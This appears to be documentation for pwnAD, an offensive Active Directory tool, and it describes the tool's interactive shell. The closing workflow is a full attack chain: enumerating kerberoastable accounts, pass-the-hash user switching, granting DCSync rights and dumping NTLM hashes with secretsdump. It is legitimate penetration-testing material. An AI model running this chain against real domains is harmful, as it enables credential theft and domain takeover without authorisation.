# Interactive Mode

pwnAD includes a powerful interactive shell for streamlined AD operations. Launch it with the `-i` or `--interactive` flag.

## Starting Interactive Mode

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!'
```

Output:
```
 ____ ____ ____ ____ ____
|p ||w ||n ||A ||D |
|__||__||__||__||__|
|/__\|/__\|/__\|/__\|/__\|

Version 0.0.1 by @LightxR


pwnAD [domain.local\administrator]>
```

## Features

### Tab Completion

Press Tab to see available commands and subcommands:

```
pwnAD [domain.local\administrator]>
add           getNThash     getTGT        modify        rebind        shadow        switch_user
get           getST         infos         query         remove        start_tls
```

Completion also works for subcommands:

```
pwnAD [domain.local\administrator]> add
add RBCD             add dcsync           add groupMember      add write_gpo_dacl
add computer         add genericAll       add user
```

### Command History

Use Up/Down arrows to navigate through command history.

## Special Commands

These commands are only available in interactive mode.

### infos

Display current connection details:

```bash
pwnAD [domain.local\administrator]> infos
[*] Target:     192.168.1.10
[*] Port:       389
[*] Domain:     domain.local
[*] User:       administrator
[*] Password:   Password123!
[*] LM_hash:    None
[*] NT_hash:    None
[*] aesKey:     None
[*] pfx:        None
[*] key:        None
[*] cert:       None
[*] kerberos:   False
[*] TLS:        False
```

### start_tls

Upgrade a plaintext LDAP connection (port 389) to TLS:

```bash
pwnAD [domain.local\administrator]> start_tls
[*] Sending StartTLS command...
[*] StartTLS succeded, you are now connected through a TLS channel
```

This is useful when you need TLS for sensitive operations like password changes:

```bash
# Without TLS - fails
pwnAD [domain.local\administrator]> modify password lowpriv NewPassword123!
[-] Server unwilling to perform the operation...

# Upgrade to TLS
pwnAD [domain.local\administrator]> start_tls
[*] StartTLS succeded, you are now connected through a TLS channel

# Now it works
pwnAD [domain.local\administrator]> modify password lowpriv NewPassword123!
[*] Successfully changed lowpriv password to: NewPassword123!
```

### rebind

Reconnect to the LDAP server if the connection times out or is reset:

```bash
pwnAD [domain.local\administrator]> shadow list lowpriv
[-] An error has occured : socket sending error[Errno 104] Connection reset by peer

pwnAD [domain.local\administrator]> rebind
[*] Successfully performed a connection rebind.

pwnAD [domain.local\administrator]> shadow list lowpriv
[*] Targeting user lowpriv
[*] Listing Key Credentials for lowpriv
[*] DeviceID:1d8669ab-6a68-a58c-6b46-606e3623f579 | Creation Time (UTC): 2025-02-03 11:13:41
```

### switch_user

Change user context without restarting the shell:

```bash
pwnAD [domain.local\administrator]> switch_user -u lowpriv -p 'LowPrivPassword!'
[*] Successfully switched user to lowpriv.

pwnAD [domain.local\lowpriv]>
```

The prompt updates to reflect the current user. You can also switch authentication methods:

```bash
# Switch to hash-based authentication
pwnAD [domain.local\administrator]> switch_user -u serviceaccount -H ':31d6cfe0d16ae931b73c59d7e0c089c0'

# Switch to certificate authentication
pwnAD [domain.local\administrator]> switch_user -u admin2 -pfx admin2.pfx
```

## OS Command Execution

Prefix commands with `!` to execute them in the system shell:

```bash
pwnAD [domain.local\administrator]> !ls
LICENSE  pwnAD  README.md  setup.py

pwnAD [domain.local\administrator]> !whoami
kali

pwnAD [domain.local\administrator]> !export KRB5CCNAME=/tmp/admin.ccache
```

This is particularly useful for:

- Setting environment variables (`KRB5CCNAME`)
- Checking local files
- Running other tools alongside pwnAD

## Workflow Example

A typical interactive session might look like:

```bash
# Start interactive mode
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'LowPrivPass!'

# Check connection
pwnAD [domain.local\lowpriv]> infos

# Enumerate users
pwnAD [domain.local\lowpriv]> get users

# Find kerberoastable accounts
pwnAD [domain.local\lowpriv]> get kerberoastables

# Switch to compromised admin account
pwnAD [domain.local\lowpriv]> switch_user -u admin -H ':aabbccdd...'

# Add DCSync rights
pwnAD [domain.local\admin]> add dcsync lowpriv

# If connection drops
pwnAD [domain.local\admin]> rebind

# Run secretsdump from the same session
pwnAD [domain.local\admin]> !secretsdump.py domain.local/lowpriv@192.168.1.10 -just-dc-ntlm
```
